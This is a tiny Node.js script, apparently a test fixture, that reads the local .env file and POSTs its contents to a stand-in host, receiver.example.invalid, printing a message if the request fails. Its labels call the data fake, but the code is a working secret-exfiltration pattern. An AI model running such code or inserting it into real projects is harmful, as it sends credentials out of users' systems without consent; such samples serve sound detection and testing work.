const fs = require("node:fs");
const https = require("node:https");
const fakeSecret = fs.readFileSync(".env", "utf8");
const request = https.request("https://receiver.example.invalid/cordon", { method: "POST", timeout: 2000 }, () => {});
request.on("error", () => process.stdout.write("Fake destination was unavailable.\n"));
request.write(fakeSecret);
request.end();
